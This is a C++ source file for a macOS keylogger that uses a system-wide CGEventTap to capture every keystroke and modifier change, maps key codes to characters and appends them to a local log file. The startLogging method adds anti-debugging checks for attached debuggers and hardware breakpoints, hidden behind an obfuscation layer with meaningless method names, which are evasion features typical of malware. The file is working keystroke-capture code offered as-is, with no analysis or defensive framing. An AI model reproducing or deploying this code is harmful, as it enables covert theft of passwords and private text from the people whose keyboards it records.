#include "../include/macOsLogger.h"
#include "../include/antiDebug.h"
#include "../include/obfuscator.h"

#if defined(__APPLE__)

/**
 * @brief Construct a new Mac Os Logger:: Mac Os Logger object
 */
MacOsLogger::MacOsLogger() : logFileName("recording.log"), counter(0)
{
    initializeKeyMap();
    logFile.open(logFileName, std::ios::app);
    if (!logFile.is_open())
    {
        throw std::ios_base::failure("Unable to access recordings log file. Please make sure you have the correct permissions.");
    }
    chmod(logFileName.c_str(), 0644);
}

/**
 * @brief Destroy the Mac Os Logger:: Mac Os Logger object
 */
MacOsLogger::~MacOsLogger()
{
    if (logFile.is_open())
    {
        logFile.close();
    }
}

/**
 * @brief This method will start the keylogger on macOS.
 */
void MacOsLogger::startLogging()
{
    AntiDebug ad;
    Obfuscator ob;

    ob.registerMethod<bool>("guGu", [&ad]() { return ad.isDebuggerPresent(); });
    if (ob.callMethod<bool>("guGu"))
    {
        throw std::runtime_error("Debugger detected. Don't do this... :)");
    }

    ob.registerMethod<bool>("6666", [&ad]() { return ad.checkForHardwareBreakpoints(); });
    if (ob.callMethod<bool>("6666"))
    {
        throw std::runtime_error("Hardware breakpoints detected. Don't do this... :)");
    }

    CGEventFlags oldFlags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));

    eventTap = CGEventTapCreate(
            kCGSessionEventTap,
            kCGHeadInsertEventTap,
            kCGEventTapOptionDefault,
            eventMask,
            myCGEventCallback,
            this
    );

    if (!eventTap)
    {
        std::cerr << "Error: Unable to create event tap." << std::endl;
    }

    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    logFile << "\n\nRecording started\n" << std::put_time(std::localtime(&now), "%c %Z") << "\n";
    std::cout << "Logging to: " << logFileName << '\n';

    CFRunLoopRun();
}

/**
 * @brief This is the callback function for the event tap.
 * @param proxy -> The event tap proxy.
 * @param type -> The event type.
 * @param event -> The event.
 * @param refcon -> The reference context.
 * @return CGEventRef, the event reference.
 */
CGEventRef MacOsLogger::myCGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon)
{
    MacOsLogger *logger = static_cast<MacOsLogger *>(refcon);

    if ((type != kCGEventKeyDown) && (type != kCGEventFlagsChanged))
    {
        return event;
    }

    logger->counter++;
    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    if (logger->keyMap.find(keyCode) != logger->keyMap.end())
    {
        std::string key = logger->keyMap[keyCode];
        std::cout << "Logging key: " << key << std::endl;

        logger->logFile.open(logger->logFileName, std::ios::app);
        if (logger->logFile.is_open())
        {
            logger->logFile << key;
            logger->logFile.flush();
            logger->logFile.close();
        }
        else
        {
            std::cerr << "Error: Unable to open log file for writing.\n";
        }
    }
    else
    {
        std::cerr << "Key not found in keyMap for code: " << keyCode << std::endl;
    }

    return event;
}

/**
 * @brief This is the key map for the macOS key codes.
 */
void MacOsLogger::initializeKeyMap()
{
    keyMap = {
            {0, "a"}, {1, "s"}, {2, "d"}, {3, "f"}, {4, "h"}, {5, "g"}, {6, "z"},
            {7, "x"}, {8, "c"}, {9, "v"}, {11, "b"}, {12, "q"}, {13, "w"}, {14, "e"},
            {15, "r"}, {16, "y"}, {17, "t"}, {18, "1"}, {19, "2"}, {20, "3"}, {21, "4"},
            {22, "6"}, {23, "5"}, {24, "="}, {25, "9"}, {26, "7"}, {27, "-"}, {28, "8"},
            {29, "0"}, {30, "]"}, {31, "o"}, {32, "u"}, {33, "["}, {34, "i"}, {35, "p"},
            {37, "l"}, {38, "j"}, {39, "'"}, {40, "k"}, {41, ";"}, {42, "\\"}, {43, ","},
            {44, "/"}, {45, "n"}, {46, "m"}, {47, "."}, {50, "`"}, {65, "[decimal]"},
            {67, "[asterisk]"}, {69, "[plus]"}, {71, "[clear]"}, {75, "[divide]"},
            {76, "[enter]"}, {78, "[hyphen]"}, {81, "[equals]"}, {82, "0"}, {83, "1"},
            {84, "2"}, {85, "3"}, {86, "4"}, {87, "5"}, {88, "6"}, {89, "7"}, {91, "8"},
            {92, "9"}, {36, "[return]"}, {48, "[tab]"}, {49, " "}, {51, "[del]"},
            {53, "[esc]"}, {54, "[right-cmd]"}, {55, "[left-cmd]"}, {56, "[left-shift]"},
            {57, "[caps]"}, {58, "[left-option]"}, {59, "[left-ctrl]"}, {60, "[right-shift]"},
            {61, "[right-option]"}, {62, "[right-ctrl]"}, {63, "[fn]"}, {64, "[f17]"},
            {72, "[volup]"}, {73, "[voldown]"}, {74, "[mute]"}, {79, "[f18]"}, {80, "[f19]"},
            {90, "[f20]"}, {96, "[f5]"}, {97, "[f6]"}, {98, "[f7]"}, {99, "[f3]"}, {100, "[f8]"},
            {101, "[f9]"}, {103, "[f11]"}, {105, "[f13]"}, {106, "[f16]"}, {107, "[f14]"},
            {109, "[f10]"}, {111, "[f12]"}, {113, "[f15]"}, {114, "[help]"}, {115, "[home]"},
            {116, "[pgup]"}, {117, "[fwddel]"}, {118, "[f4]"}, {119, "[end]"}, {120, "[f2]"},
            {121, "[pgdown]"}, {122, "[f1]"}, {123, "[left]"}, {124, "[right]"}, {125, "[down]"},
            {126, "[up]"}
    };
}
#endif